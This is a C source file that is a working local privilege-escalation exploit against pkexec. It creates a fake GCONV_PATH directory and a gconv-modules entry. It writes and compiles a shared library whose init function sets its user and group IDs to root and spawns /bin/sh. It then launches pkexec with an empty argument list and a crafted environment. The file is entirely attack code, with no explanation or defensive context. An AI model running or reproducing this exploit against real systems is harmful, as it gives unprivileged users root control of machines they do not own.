#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<fcntl.h>

void so_file(){
    int f=open("lpe/payload.c",O_CREAT|O_RDWR,0777);
    char so_payload[]=
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n"
        "void gconv() {}\n"
        "void gconv_init() {\n"
        "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
        "  static char *envp[] = { \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL };\n"
        "  execve(\"/bin/sh\",NULL,envp);\n"
        "  exit(0);\n"
        "}\n";
    write(f,so_payload,strlen(so_payload));
    close(f);
    system("gcc lpe/payload.c -shared -fPIC -o lpe/payload.so");
}

int main() {
    char *envp[]={
        "lpe",
        "PATH=GCONV_PATH=.",
        "CHARSET=LPE",
        "SHELL=lpe",
        NULL
    };
    mkdir("GCONV_PATH=.", 0777);
    int fd = open("GCONV_PATH=./lpe", O_CREAT|O_RDWR, 0777); 
    close(fd);
    mkdir("lpe", 0777);
    so_file();
    int fd1=open("lpe/gconv-modules",O_CREAT|O_RDWR,0777);
    char *mod_str="module  UTF-8/\/   LPE/\/    payload    2\n";
    write(fd1,mod_str,strlen(mod_str));
    close(fd1);
    execve("/usr/bin/pkexec",(char **) NULL,envp);
}
